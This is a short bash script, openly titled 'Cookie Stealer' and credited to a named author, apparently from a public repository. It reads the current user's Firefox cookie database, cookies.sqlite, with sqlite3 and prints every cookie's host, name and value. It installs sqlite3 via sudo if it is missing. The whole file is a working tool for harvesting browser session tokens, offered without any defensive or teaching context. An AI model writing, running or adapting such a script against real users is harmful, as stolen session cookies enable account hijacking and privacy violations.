#!/bin/bash
set -e
##################################
##### Cookie Stealer #############
##################################
############## By .magicsale #####
##################################
# GitHub: https://github.com/matteosalis04
##################################
##################################



if ! command -v sqlite3 &> /dev/null; then
    echo "sqlite3 non installato!"
    echo "---------------------"
    sudo apt install sqlite3
fi

path="/home/$(whoami)/snap/firefox/common/.mozilla/firefox/*.default/cookies.sqlite"
cookie=$(sqlite3 $path "SELECT host, name, value FROM moz_cookies;")

function cookie() {
    if [[ -z $cookie ]]; then
        echo "nessun cookie trovato"
        exit 0
    fi
    while IFS='|' read -r host name value; do
        echo "host: $host"
        echo "name: $name" 
        echo "value: $value" 
        echo "---------------"
        echo "" 


    done <<< $cookie 

}

cookie


